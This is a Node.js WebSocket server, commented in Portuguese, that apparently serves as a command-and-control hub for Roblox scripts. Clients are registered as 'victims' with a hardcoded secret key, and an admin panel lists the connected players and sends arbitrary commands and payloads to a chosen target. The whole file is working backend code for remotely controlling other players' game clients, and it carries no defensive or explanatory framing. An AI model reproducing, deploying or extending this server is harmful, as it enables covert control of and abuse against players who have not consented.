const WebSocket = require('ws');

const PORT = process.env.PORT || 8080;
const wss = new WebSocket.Server({ port: PORT });

// A mesma senha secreta que está nos seus scripts do Roblox
const CHAVE_SECRETA = "BatataFritaComQueijo123";

let clientesConectados = new Map(); // Guarda socket -> nome do jogador (vítimas + admin)
let painelAdmin = null; // Guarda a conexão do painel de controle

console.log(`[SERVIDOR] WebSocket rodando com sucesso na porta ${PORT}...`);

// Função auxiliar para mandar a lista atualizada de quem está conectado para o admin
function atualizarListaAdmin() {
    if (painelAdmin && painelAdmin.readyState === WebSocket.OPEN) {
        painelAdmin.send(JSON.stringify({
            tipo: "atualizar_lista",
            clientes: Array.from(clientesConectados.keys())
        }));
    }
}

wss.on('connection', (ws) => {
    console.log('[CONEXÃO] Novo cliente conectado ao servidor.');

    ws.on('message', (message) => {
        let data;
        try {
            data = JSON.parse(message);
        } catch (e) {
            console.log('[ERRO] Mensagem recebida não é um JSON válido.');
            return;
        }

        // 1. Autenticação das Vítimas normais
        if (data.tipo === 'auth') {
            if (data.chave !== CHAVE_SECRETA) {
                console.log('[AUTENTICAÇÃO FALHOU] Chave secreta incorreta de um cliente.');
                ws.close();
                return;
            }
            clientesConectados.set(data.jogador, ws);
            ws.nomeJogador = data.jogador;
            console.log(`[VÍTIMA CONECTADA]: ${data.jogador}`);
            atualizarListaAdmin();
        }

        // 2. Autenticação do Painel Admin (Agora também entra na lista de clientes se mandar o nome!)
        if (data.tipo === 'auth_admin') {
            if (data.chave !== CHAVE_SECRETA) {
                console.log('[AUTENTICAÇÃO FALHOU] Tentativa inválida de login no Admin.');
                ws.close();
                return;
            }
            painelAdmin = ws;
            
            // Registra o admin na lista de conectados para ele aparecer na própria GUI
            if (data.jogador) {
                clientesConectados.set(data.jogador, ws);
                ws.nomeJogador = data.jogador;
            }

            console.log(`[PAINEL ADMIN CONECTADO]: ${data.jogador || "Admin"}`);
            atualizarListaAdmin();
        }

        // 3. O Painel Admin manda um comando para um alvo específico (com suporte a payload e remetente)
        if (data.tipo === 'comando' && ws === painelAdmin) {
            let alvoSocket = clientesConectados.get(data.alvo);
            
            if (alvoSocket && alvoSocket.readyState === WebSocket.OPEN) {
                alvoSocket.send(JSON.stringify({
                    comando: data.comando,
                    payload: data.payload || null,
                    remetente: data.remetente || null
                }));
                console.log(`[COMANDO ENVIADO] Alvo: ${data.alvo} | Ação: ${data.comando}`);
            } else {
                console.log(`[ERRO] Alvo "${data.alvo}" não foi encontrado ou está desconectado.`);
            }
        }
    });

    // Evento quando alguém se desconecta
    ws.on('close', () => {
        if (ws === painelAdmin) {
            painelAdmin = null;
            console.log('[PAINEL ADMIN] Você se desconectou do servidor.');
        } 
        
        if (ws.nomeJogador) {
            clientesConectados.delete(ws.nomeJogador);
            console.log(`[CLIENTE DESCONECTADO]: ${ws.nomeJogador}`);
            atualizarListaAdmin(); // Atualiza a lista tirando quem saiu
        }
    });

    // Lida com erros de conexão
    ws.on('error', (err) => {
        console.log('[ERRO NO SOCKET]:', err.message);
    });
});
